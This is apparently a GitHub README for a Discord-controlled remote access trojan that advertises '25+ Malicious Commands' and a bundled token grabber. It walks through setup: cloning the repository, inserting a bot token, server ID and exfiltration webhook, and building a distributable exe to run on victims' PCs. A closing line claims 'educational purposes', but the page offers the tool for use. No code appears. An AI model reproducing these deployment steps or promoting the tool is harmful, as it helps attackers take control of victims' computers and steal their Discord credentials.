# Advanced-Discord-Rat
Cool remote access trojan to control victims pc via discord bot. No port forwarding required

### 🔰・Features
* ` Slash Commands!`
* ` 25+ Malicious Commands`
* ` Buttons and Dropdowns/selection menus`
* ` Easy to setup and use`
* ` Updated version` of https://github.com/Rdimo/DiscordRAT

### 📁・Setting up the RAT
1. Start off by ofc installing [python](https://www.python.org/)
2. do `git clone https://github.com/Rdimo/DiscordRAT.git` and open a cmd in the same directory and type `pip install -r requirements.txt`
3. Now time to get the bot token, follow this guide [here](https://www.writebots.com/discord-bot-token) on how to do that
4. After you got your token you need to enable intents for the bot
<img alt="Intents" src="https://cdn.discordapp.com/attachments/828047793619861557/888421741590884372/Screenshot_2021-09-17_154808.png">

5. Go into main.py
   - go to where it says `token = 'BOTTOKENHERE'` (line 56)
     - Replace `BOT_TOKE_HERE` with your bot token that you got from the [developer page](https://discord.com/developers)
       - go to where it says `g = [GUILDIDHERE]` (line 57)
         - Replace `GUILD_ID_HERE` with the id of your server that you want the bot to be in ([server id?](https://support.discord.com/hc/en-us/articles/206346498-Where-can-I-find-my-User-Server-Message-ID))
          - Replace `WEBHOOKLINKHERE` with a discoord webook
6. Now your ready to invite your bot to your server, go to the the [developer page](https://discord.com/developers) and go to the page `OAuth2` and enable these options
<img alt="OAuth2" src="https://cdn.discordapp.com/attachments/905814376043401249/906199066965336094/unknown.png">
7. now copy the given url and paste it in your browser to invite the bot to your server
8. When your done with all of that, simply open **build-exe.bat** and enter a name for the exe and now your done!


---

### 🎉・Credits
Although this discord rat was modified by me the original is https://github.com/Sp00p64/DiscordRAT and https://github.com/Rdimo/DiscordRAT and credits goes to him and his discord rat. I just added some more advanced commands and even added a builtin Rdimo's https://github.com/Rdimo/Hazard-Token-Grabber-V2
---

|⚠️・this Discord rat was made for educational purposes・⚠️|
|-------------------------------------------------|
By using Discord Rat, you agree that you hold responsibility and accountability of any consequences caused by your actions
